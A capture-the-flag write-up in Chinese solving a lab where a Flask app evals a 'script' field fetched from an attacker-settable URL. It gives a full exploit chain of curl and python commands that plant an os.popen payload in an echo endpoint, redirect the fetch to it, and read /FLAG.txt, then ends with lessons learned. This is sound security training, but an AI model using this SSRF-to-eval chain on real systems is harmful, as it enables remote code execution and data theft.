## 题解

### 入口与指纹

三个组件（首页底部的 Hosts 表写明）：

| 名称 | 地址 | 对外映射 |
| --- | --- | --- |
| Nginx Root（dashboard） | `http://nginx:80/` | `:80` |
| Flask App | `http://flask_app:8080` | `http://nginx:80/app/`（实际直接暴露 `:8080`） |
| Flask API | `http://flask_api:8081` | `:8081` |

### 关键观察

**1. dashboard 有两个可写状态，都能被读回原始字符串。**

```bash
GET /api/set?url=<URL>     # 保存「API URL」
GET /api/get               # 原样返回保存的 URL
GET /name/set?name=<任意>  # 保存 hostname
GET /name/get              # 原样返回保存的内容（不转义、不加引号）
```

**2. `flask_app:8080/app` 会去拉取「API URL」并 `eval` 其中的 `script` 字段。**

```bash
curl http://$T:8080/app
# 默认 URL 是 flask_api:8081/script，返回 {"script": "'OK ' * 4"}
# 页面渲染 <div class="result">OK OK OK OK </div>
```

也就是说：请求 → 取 JSON → 取 `script` → `eval`。

**3. 外部地址不可达，但 nginx 可达。**

把 URL 指向外加的 `http://10.254.1.70:8899/...` 时，`/app` 返回 500
`Network is unreachable`——flask_app 在容器内网，只能访问 `nginx` / `flask_api`。
而 `/name/get` 恰好是「返回我们写入的原文」的接口，可以直接当 payload 托管点。

### 利用链

```bash
T=$(head -1 .target)     # IP，:80 是 dashboard，:8080 是 flask_app
# 1. 把要 eval 的脚本写进 name
python3 -c 'import json;print(json.dumps({"script":"__import__(\x27os\x27).popen(\x27cat /FLAG.txt\x27).read()"}),end="")' > /tmp/nm.txt
curl -sS -G --data-urlencode "name@/tmp/nm.txt" "http://$T/name/set"
# 2. 让 flask_app 去拉「nginx 上的 name」
curl -sS -G --data-urlencode 'url=http://nginx:80/name/get' "http://$T/api/set"
# 3. 触发
curl -sS "http://$T:8080/app" | grep -o 'flag{[^}]*}'
```

### flag 位置

flask_app 容器的 `/FLAG.txt`，通过 `eval` 里的 `os.popen` 读出并渲染。

## 复盘

- **两个「可写入 + 可原样读回」的接口拼起来就是一个 payload 托管服务。** 不需要能访问外网。
- **容器内网的主机名要从页面上抄（Hosts 表）。** 只有 `nginx`、`flask_app`、`flask_api` 能互相访问，
  用 VPN 的 IP 会 `Network is unreachable`，这是本题最容易误判成「SSRF 无效」的地方。
- **`eval` 的入口路径不等于默认值。** 默认 API URL 指向 `flask_api/script`，看起来只是「读一段固定脚本」，
  但 URL 可改，于是变成任意代码。
